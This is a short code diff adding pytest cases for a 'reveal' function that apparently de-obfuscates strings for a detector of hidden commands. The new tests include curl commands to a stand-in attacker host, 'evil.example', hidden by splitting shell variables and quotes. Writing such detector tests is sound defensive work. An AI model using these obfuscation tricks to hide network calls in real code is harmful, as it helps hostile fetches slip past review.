@@ -26,3 +26,11 @@ def test_percent_encoding_is_revealed():
 def test_plain_text_is_unchanged():
     s = "curl http://plain.example/readme and run pytest"
     assert reveal(s) == s
+
+
+def test_shell_variable_concatenation_is_resolved():
+    assert "evil.example" in reveal('H="ev"; D="il.example"; curl http://$H$D/x')
+
+
+def test_quote_concatenation_is_collapsed():
+    assert "evil.example" in reveal('curl "http://ev""il.example/x"')
